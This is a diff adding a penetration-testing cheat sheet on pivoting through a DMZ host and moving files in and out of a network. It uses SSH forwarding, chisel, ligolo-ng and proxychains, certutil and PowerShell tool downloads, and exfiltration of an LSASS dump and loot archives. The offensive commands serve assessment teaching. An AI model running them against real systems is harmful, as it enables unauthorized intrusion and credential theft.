@@ -1,0 +1,247 @@
+---
+title: "Pivoting & File Transfer"
+---
+
+> How to reach machines you can't touch directly, and how to move files **in both directions** across that boundary. The single most important idea is **directionality** — most failures here (`System error 53`, RDP hangs, "no route to host") are someone fighting the direction the tunnel actually flows. Read the concepts first; they save hours.
+
+<Warning>
+**⚠️ Verify flags before relying on these mid‑assessment**
+
+Commands are written from experience; **chisel/ligolo/ssh syntax and proxychains behaviour vary by version**. Treat each as a **strong starting point** — confirm with `-h`/`--help` and **correct this note as you run it for real**.
+</Warning>
+
+---
+
+## ⏱️ DECISION HEADER
+
+| Situation | Use | Jump |
+|---|---|---|
+| You have an SSH login to the pivot host | **SSH forwarding** (`-D`, `-L`, `-R`) — nothing to upload | [SSH](#1-ssh-port-forwarding-no-tools-needed) |
+| You have a shell (not SSH) on the pivot | **chisel** (upload a binary) | [chisel](#2-chisel-socks--port-forwards) |
+| You need GUI tools / RDP / nmap to "just work" | **ligolo‑ng** (transparent TUN route) | [ligolo](#3-ligolo-ng-transparent-tun--best-for-rdpscanning) |
+| You just need a whole subnet routed, have SSH | **sshuttle** (poor‑man's VPN) | [sshuttle](#4-sshuttle) |
+| Download a tool **to** a Windows target | `Invoke-WebRequest` / `certutil` / SMB / RDP drive | [to Windows](#downloading-to-a-windows-target) |
+| Download a tool **to** a Linux target | `wget` / `curl` / `scp` | [to Linux](#downloading-to-a-linux-target) |
+| Exfil a file **from** an internal host to Kali | `evil-winrm download` / stage via DMZ / base64 | [exfil](#pulling-files-from-the-target-to-kali-the-hard-direction) |
+| RDP/SSH/cert step "connects then hangs" over VPN | **lower tun0 MTU to 1200** | [MTU](#-the-mtu-trap) |
+
+---
+
+## 0. CONCEPTS (understand these or nothing makes sense)
+
+### The reachability rule — pivots are usually ONE‑WAY
+```
+   Kali (10.10.x.x, external)  ── can reach ──►  DMZ external IP
+                                                 DMZ ALSO sits on 172.16.x.x (internal)
+   Internal hosts (DC, FILE, JUMP)  ── can reach ──►  DMZ internal IP
+   Internal hosts  ── CANNOT reach ──►  Kali's external IP
+```
+- Your pivot lets **you → internal**. It does **not** automatically let **internal → you**.
+- That's why `net use \\<KALI_IP>\share` from a DC fails with **`System error 53`** — the DC has no route back to your external address.
+- To go the "wrong" way (pull a file out, catch a reverse shell), you must either **pull over an existing session** (you initiate), or **stage through a host the internal box CAN reach** (the DMZ), or build a **reverse forward**.
+
+### Three kinds of tunnel (pick the right tool)
+| Type | What it gives you | Example |
+|---|---|---|
+| **SOCKS proxy** | A port on Kali (e.g. 1080); tools must be *proxy‑aware* (use `proxychains`) | `ssh -D`, chisel `socks` |
+| **Port forward** | One specific `host:port` mapped to a local port; no proxychains needed | `ssh -L 13389:dc:3389` |
+| **TUN route** | A real network interface + route; the subnet becomes *transparently* reachable; ALL tools work natively | ligolo‑ng, sshuttle |
+
+> **proxychains can't carry everything.** Protocols that open extra/UDP channels — **RDP**, sometimes nmap SYN scans — break over SOCKS. For those use a **port forward** or a **TUN route**.
+
+### proxychains config (`/etc/proxychains4.conf`)
+```
+# bottom of the file — match your SOCKS listener
+strict_chain
+proxy_dns
+[ProxyList]
+socks5 127.0.0.1 1080
+```
+> Kali uses **`/etc/proxychains4.conf`** (the `4`), not `proxychains.conf`. Comment out the default Tor `socks4 ... 9050` line. Use `socks5`, not `socks4`, for DNS + reliability. Usage: `proxychains <tool> ...`. Add `-q` to silence the chain spam: `proxychains -q nxc ...`.
+
+---
+
+## 1. SSH port forwarding (no tools needed)
+If you can SSH to the pivot, you need **nothing else**. Run these **on Kali**.
+
+```bash
+# Dynamic (-D): a SOCKS proxy → reach the WHOLE subnet via proxychains
+ssh -D 1080 jbetty@<DMZ_IP>
+#   /etc/proxychains4.conf -> socks5 127.0.0.1 1080 ; then:
+proxychains nxc smb 172.16.119.11 -u user -p pass
+
+# Local (-L): map ONE internal service to a Kali local port (great for RDP)
+ssh -L 13389:172.16.119.7:3389 jbetty@<DMZ_IP>
+xfreerdp3 /v:127.0.0.1:13389 /u:bdavid /p:'...' /cert:ignore     # no proxychains
+
+# Remote (-R): make a Kali service reachable FROM the pivot side (reverse)
+ssh -R 8000:127.0.0.1:8000 jbetty@<DMZ_IP>      # DMZ's :8000 -> Kali's :8000
+```
+- **`-L` (local):** "bring *their* service to *my* localhost." Use for RDP/WinRM/specific ports.
+- **`-D` (dynamic):** "route *anything* through them." Use with proxychains for broad enumeration.
+- **`-R` (remote):** "expose *my* service to *their* network" — the reverse direction (e.g. let an internal host download from you, or catch a reverse shell).
+- Add `-fN` to background without a shell: `ssh -fN -D 1080 jbetty@<DMZ_IP>`.
+
+---
+
+## 2. chisel (SOCKS + port forwards)
+When you have a shell but **not** SSH. You upload the `chisel` binary to the pivot.
+
+```bash
+# Kali (server, reverse mode)
+./chisel server -p 9001 --reverse
+# pivot host (client) — reverse SOCKS:
+./chisel client <KALI_IP>:9001 R:1080:socks
+#   -> SOCKS5 on Kali 127.0.0.1:1080 ; use proxychains
+
+# single reverse port forward (e.g. expose internal RDP on Kali:13389):
+./chisel client <KALI_IP>:9001 R:13389:172.16.119.7:3389
+
+# forward a Kali service INTO the network (internal host can reach Kali:8000):
+./chisel client <KALI_IP>:9001 R:172.16.119.13:8000:127.0.0.1:8000
+```
+> `R:` = **reverse** (pivot connects out to Kali — works through egress firewalls). Match the SOCKS port to proxychains. Verify it's up: `ss -tlnp | grep 1080`.
+
+---
+
+## 3. ligolo‑ng (transparent TUN — best for RDP/scanning)
+Creates a real interface + route, so **every tool works natively, no proxychains**. This is what makes RDP painless.
+
+```bash
+# Kali — one-time interface setup
+sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up
+# Kali — start the proxy (listens on 11601)
+sudo ./proxy -selfcert
+# pivot host — run the agent (upload it first)
+./agent -connect <KALI_IP>:11601 -ignore-cert
+# Kali — in the ligolo console:
+session            # pick the agent
+start              # activate the tunnel
+# Kali — route the internal subnet through ligolo
+sudo ip route add 172.16.119.0/24 dev ligolo
+# now everything just works:
+nxc smb 172.16.119.11 -u user -p pass
+xfreerdp3 /v:172.16.119.7 /u:bdavid /p:'...' /cert:ignore
+nmap -sT 172.16.119.0/24
+```
+**Reverse direction with ligolo** (let internal hosts reach a Kali listener — for reverse shells / file pulls):
+```bash
+# in ligolo console, on the active session:
+listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:1235 --tcp
+# now an internal host connecting to <agent_ip>:1235 hits your Kali :1235
+```
+
+---
+
+## 4. sshuttle
+Quickest "VPN" if you have SSH creds and Python on the pivot — routes a subnet transparently, no proxychains.
+```bash
+sshuttle -r jbetty@<DMZ_IP> 172.16.119.0/24
+# now use tools directly against 172.16.119.x
+```
+
+---
+
+## 5. Using tools through a pivot — what works, what doesn't
+
+| Tool / protocol | SOCKS (proxychains) | Port forward (-L / chisel R:) | TUN (ligolo/sshuttle) |
+|---|---|---|---|
+| nxc / smbclient / secretsdump | ✅ | ✅ | ✅ |
+| evil-winrm | ✅ | ✅ | ✅ |
+| **RDP (xfreerdp)** | ❌ (hangs) | ✅ | ✅ |
+| nmap | ⚠️ `-sT -Pn` only | ✅ | ✅ (full) |
+| bloodhound-python | ✅ (add `--dns-tcp`) | — | ✅ |
+
+> Over proxychains, **always** `nmap -sT -Pn` (TCP connect, no ping) — SYN/UDP scans don't traverse SOCKS. DNS over the pivot: use `--dns-tcp` (bloodhound‑python) or set the DC as nameserver.
+
+---
+
+## FILE TRANSFER
+
+### Downloading **TO** a Windows target
+The target must be able to reach your file server. Internal hosts can reach the **DMZ**, not your external Kali — host the file where they can get it.
+
+```powershell
+# PowerShell
+Invoke-WebRequest http://172.16.119.13:8080/tool.exe -OutFile C:\Users\Public\tool.exe
+# certutil (lives on every Windows box, less suspicious filename-wise)
+certutil -urlcache -split -f http://172.16.119.13:8080/tool.exe C:\Users\Public\tool.exe
+# SMB (impacket smbserver on a reachable host):
+copy \\172.16.119.13\share\tool.exe C:\Users\Public\
+# RDP drive redirect — no server at all:
+#   xfreerdp3 ... /drive:kali,/home/kali/loot   then inside Windows:
+copy \\tsclient\kali\tool.exe C:\Users\Public\
+```
+> `Invoke-WebRequest -OutFile` downloads a **single file**, never a folder. Point it at the exact `.exe`. A folder URL just saves the directory‑listing HTML.
+
+### Downloading **TO** a Linux target
+```bash
+wget http://<reachable>:8080/tool -O /tmp/tool && chmod +x /tmp/tool
+curl http://<reachable>:8080/tool -o /tmp/tool
+# recursive (a whole dir): wget -r -np -nH --cut-dirs=1 -R "index.html*" http://<reachable>:8080/Linux/
+scp tool jbetty@<DMZ_IP>:/tmp/          # if you have SSH
+```
+
+### Pulling files **FROM** the target to Kali (the hard direction)
+Internal → external is blocked, so **you** initiate the pull, or stage through the DMZ.
+
+```bash
+# 1) evil-winrm has it built in (pulls over your existing session):
+*Evil-WinRM* PS> download C:\Temp\lsass.dmp /home/kali/loot/lsass.dmp
+*Evil-WinRM* PS> upload /home/kali/tools/PrintSpoofer64.exe   # the reverse
+
+# 2) Stage through the DMZ (a host the internal box CAN reach):
+#    run smbserver on DMZ01, push from internal host, then SSH-pull DMZ->Kali
+impacket-smbserver share /tmp -smb2support -username u -password p     # ON DMZ01
+#    on the internal host:
+net use \\172.16.119.13\share /user:u p
+copy C:\Temp\loot.zip \\172.16.119.13\share\
+#    DMZ -> Kali:
+scp jbetty@<DMZ_IP>:/tmp/loot.zip ~/loot/
+
+# 3) Reverse forward (ligolo listener_add or chisel/ssh -R), then smbserver/nc ON Kali
+#    becomes reachable from inside, push to it normally.
+
+# 4) base64 paste (small files / when nothing else works):
+#    Windows:  [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\x")) | clip
+#    Kali:     echo '<paste>' | base64 -d > x
+```
+
+> ❌ `proxychains impacket-smbserver` does **not** work. proxychains only proxies **outbound client** connections; an SMB *server needs to listen*, which proxychains can't expose to the other side. To host a server reachable from inside, you need a **reverse forward** (ligolo `listener_add`, `ssh -R`, chisel `R:`) — or just put the server on the DMZ host.
+
+---
+
+## 🚨 THE MTU TRAP
+**Symptom:** SSH/RDP/PKINIT/LDAPS **connects then hangs**, or "Connection reset by peer", while `ping` and `nc -z <port>` succeed.
+**Cause:** small packets (SYN, ping) pass, but the **large packets** (SSH key exchange, RDP/TLS handshake, a Kerberos AS‑REQ carrying a certificate) exceed the VPN's path MTU, get fragmented, and are dropped.
+**Fix:**
+```bash
+sudo ip link set dev tun0 mtu 1200      # drop to 1100 if still flaky
+```
+Keep `tun0` at 1200 for the whole engagement. Confirm with `ssh -v` — at 1500 it stalls right after `expecting SSH2_MSG_KEX_ECDH_REPLY`; at 1200 it sails through.
+
+---
+
+## 🧯 CAVEATS TABLE
+| Symptom | Cause | Fix |
+|---|---|---|
+| `System error 53` on `net use \\KALI\..` | internal host can't reach your external IP | pull with `evil-winrm download`; or stage via DMZ |
+| RDP over proxychains hangs / `ERRCONNECT_CONNECT_CANCELLED` | SOCKS can't carry RDP channels | `ssh -L` the 3389 port, or use ligolo |
+| `xfreerdp` not found "on the target" | the RDP **client runs on Kali**, not the pivot | install `freerdp3-x11` on Kali, target the forwarded port |
+| `ssh` connects then hangs, no error | **MTU** (or new host key after respawn) | lower tun0 MTU; `ssh-keygen -R <ip>` |
+| proxychains "timeout"/Tor default | still pointing at `socks4 9050` | edit **`/etc/proxychains4.conf`**, add `socks5 127.0.0.1 1080` |
+| nothing on the SOCKS port | tunnel not actually up | `ss -tlnp \| grep 1080`; restart chisel/ssh |
+| `Invoke-WebRequest` saved an HTML page | you pointed it at a **folder**, not a file | target the exact `.exe` |
+| internal host can't reach `http://<KALI>:8080` | reverse reachability | host the server on the **DMZ** host instead |
+
+---
+
+## 🧠 Mindset
+1. **Know your direction.** Draw the arrows: who can reach whom. Most errors are direction mistakes.
+2. **Match the tunnel to the task:** SOCKS for broad enumeration, port‑forward for RDP/one service, TUN for "make everything just work."
+3. **proxychains ≠ magic** — RDP and SYN scans need a forward or a route, not SOCKS.
+4. **To pull files out, *you* reach in** (`download`) or **stage through a host they can reach** (the DMZ).
+5. **Hangs over the VPN = MTU.** Lower it to 1200 and stop debugging the tool.
+
+> See also: [AD Attack Path - Worked Example](/cheatsheets/ad-attack-path-worked-example) · [Windows Post-Exploitation](/cheatsheets/windows-post-exploitation)
